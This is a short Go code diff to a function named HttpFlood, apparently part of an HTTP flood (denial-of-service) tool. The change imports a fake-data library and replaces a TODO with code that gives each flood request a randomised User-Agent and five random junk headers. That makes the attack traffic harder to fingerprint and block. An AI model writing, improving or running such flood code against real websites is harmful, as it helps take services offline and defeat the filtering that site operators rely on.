@@ -4,6 +4,8 @@ import (
 	"fmt"
 	"net/http"
 	"time"
+
+	"github.com/brianvoe/gofakeit/v6"
 )
 
 func HttpFlood(url string, t int64, g, w int) (channel chan string) {
@@ -23,7 +25,10 @@ func HttpFlood(url string, t int64, g, w int) (channel chan string) {
 					continue
 				}
 
-				// TODO: Add headers
+				req.Header.Set("User-Agent", gofakeit.UserAgent())
+				for i := 0; i < 5; i++ {
+					req.Header.Set(gofakeit.Word(), gofakeit.Word())
+				}
 
 				res, err := hc.Do(req)
 
